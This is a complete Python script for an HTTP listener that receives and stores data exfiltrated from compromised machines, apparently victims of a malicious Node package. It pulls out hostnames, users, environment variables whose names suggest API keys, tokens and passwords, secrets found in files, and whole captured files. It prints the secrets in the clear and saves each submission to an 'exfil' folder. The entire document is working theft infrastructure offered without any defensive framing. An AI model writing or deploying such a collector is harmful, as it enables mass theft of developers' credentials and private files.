from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime, os

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[GET] {self.path} from {self.client_address[0]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        
        print(f"\n{'='*70}")
        print(f"[POST] {self.path} from {self.client_address[0]}")
        print(f"Size: {len(data)} bytes")
        print(f"{'='*70}")
        
        try:
            parsed = json.loads(data)
            
            
            print(f"Hostname: {parsed.get('hostname')}")
            print(f"User: {parsed.get('user')}")
            print(f"CWD: {parsed.get('cwd')}")
            print(f"Node: {parsed.get('node_version')}")
            
            
            env = parsed.get("env", {})
            sensitive = {k: v for k, v in env.items() if any(
                s in k.upper() for s in ["KEY", "TOKEN", "SECRET", "PASSWORD", "AUTH", "CREDENTIAL", "API"]
            )}
            if sensitive:
                print(f"\n[!] Sensitive ENV variables found:")
                for k, v in sensitive.items():
                    print(f"    {k} = {v[:100]}")
            
            
            secrets = parsed.get("secrets", [])
            if secrets:
                print(f"\n[!] Secrets found in files:")
                for s in secrets:
                    print(f"    {s['file']}: {s['matches']}")
            
            
            files = parsed.get("files", {})
            if files:
                print(f"\n[!] Files captured: {list(files.keys())}")
            
            print(f"{'='*70}\n")
            
        except json.JSONDecodeError:
            print(data.decode("utf-8", errors="replace")[:3000])
            print(f"{'='*70}\n")
        
      
        os.makedirs("exfil", exist_ok=True)
        with open(f"exfil/{timestamp}.json", "wb") as f:
            f.write(data)
        
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8888), Handler)
    print("Listening on 8888...")
    server.serve_forever()
